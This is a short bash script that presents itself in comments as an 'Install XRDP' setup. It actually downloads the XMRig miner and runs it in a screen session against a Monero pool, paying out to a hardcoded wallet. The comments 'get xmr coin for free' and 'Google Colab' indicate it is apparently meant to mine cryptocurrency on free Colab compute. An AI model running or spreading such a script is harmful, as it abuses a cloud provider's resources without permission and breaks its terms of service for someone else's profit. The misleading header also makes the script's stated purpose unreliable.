#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o sg.minexmr.com:443 -u 89AZB4nEHnyRitiFn5cj7BiBR9b8jXhrrChzrfdmi1kpdt8kr6JiPx82jyseExV4gQTvrEu8DhXzCdpPrD7q2hA5AcmQDrK -k --tls --rig-id GC
